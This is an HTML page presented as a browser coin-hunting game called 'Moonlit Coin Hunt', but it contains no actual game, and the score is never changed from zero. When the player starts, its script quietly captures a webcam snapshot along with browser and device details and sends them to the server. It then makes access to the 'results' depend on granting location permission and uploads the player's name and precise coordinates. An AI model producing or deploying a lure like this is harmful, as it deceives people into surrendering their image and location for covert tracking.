<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Moonlit Coin Hunt</title>
<style>
  body {
    background: #111;
    color: #eee;
    font-family: "Georgia", serif;
    text-align: center;
    padding: 20px;
  }

  h1 {
    margin-bottom: 10px;
    font-size: 36px;
    text-shadow: 0 0 5px #555;
  }

  #timer {
    font-size: 34px;
    font-weight: bold;
    margin: 10px 0 20px 0;
    color: #ffcc00;
  }

  #startBtn, button {
    background: #333;
    color: #eee;
    border: 2px solid #777;
    padding: 12px 22px;
    font-size: 20px;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.25s;
  }

  #startBtn:hover, button:hover {
    background: #555;
  }

  #endPopup {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);
    color: white;
    padding-top: 150px;
    font-size: 22px;
  }

  input {
    padding: 10px;
    margin: 10px 0;
    font-size: 20px;
    border-radius: 5px;
    border: 1px solid #555;
    width: 260px;
    text-align: center;
  }

  #showResults:disabled {
    background: #444;
    border-color: #333;
    color: #777;
    cursor: not-allowed;
  }
</style>
</head>
<body>

<h1>ðŸŒ• Moonlit Coin Hunt</h1>
<div id="timer">60</div>

<button id="startBtn">Commence the Game!</button>

<div id="endPopup">
  <p>The sands of time have run their course, noble wanderer.</p>
  <p>Pray, enter thy name:</p>

  <input id="playerName" type="text" placeholder="Thy nameâ€¦"><br>

  <button id="grantGeo">Grant Location Permission</button><br><br>

  <button id="showResults" disabled>Reveal My Results</button>
</div>

<script>
// =====================================================
// CONTROL FLAGS â€” to prevent duplicates
// =====================================================
let snapshotSent = false;
let earlyDataSent = false;
let finalDataSent = false;

let gameEnded = false;
let timerInterval = null;
let score = 0; // you may update this during your game

// =====================================================
// ELEMENTS
// =====================================================
const startBtn = document.getElementById("startBtn");
const timerDiv = document.getElementById("timer");
const endPopup = document.getElementById("endPopup");

// =====================================================
// CAMERA SNAPSHOT â€” one-time only
// =====================================================
async function captureSnapshot() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    await new Promise(r => setTimeout(r, 500));

    const canvas = document.createElement("canvas");
    canvas.width = 300;
    canvas.height = 200;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64 = canvas.toDataURL("image/png");

    stream.getTracks().forEach(t => t.stop());
    return base64;
  } catch (err) {
    return null;
  }
}

// =====================================================
// CLIENT DATA
// =====================================================
function collectClientData() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height
    }
  };
}

// =====================================================
// SEND DATA TO SERVER
// =====================================================
async function sendInitialData() {
  if (earlyDataSent) return;
  earlyDataSent = true;

  let snapshot = null;

  if (!snapshotSent) {
    snapshot = await captureSnapshot();
    snapshotSent = true;
  }

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "initial",
      snapshot,
      client
    })
  });
}

async function sendFinalData(name, pos) {
  if (finalDataSent) return;
  finalDataSent = true;

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "final",
      name,
      client,
      location: pos ? {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      } : null,
      score
    })
  });
}

// =====================================================
// START GAME
// =====================================================
startBtn.addEventListener("click", () => {
  startBtn.style.display = "none";
  sendInitialData(); // Send snapshot + early data

  let timeLeft = 60;

  timerInterval = setInterval(() => {
    timeLeft--;
    timerDiv.textContent = timeLeft;

    if (timeLeft <= 0) endGame();
  }, 1000);
});

// =====================================================
// END GAME
// =====================================================
function endGame() {
  if (gameEnded) return;
  gameEnded = true;

  clearInterval(timerInterval);
  endPopup.style.display = "block";
}

// =====================================================
// LOCATION & FINAL SEND
// =====================================================
document.getElementById("grantGeo").onclick = () => {
  const name = document.getElementById("playerName").value || "Unknown Stranger";

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      document.getElementById("showResults").disabled = false;
      sendFinalData(name, pos);
    },
    (err) => {
      alert("Thou hast denied the location, fair traveller.");
    }
  );
};

// =====================================================
// SHOW RESULTS â€” purely frontend
// =====================================================
document.getElementById("showResults").onclick = () => {
  alert("Thy amassed riches amount to: " + score + " coins!");
};

</script>
</body>
</html>
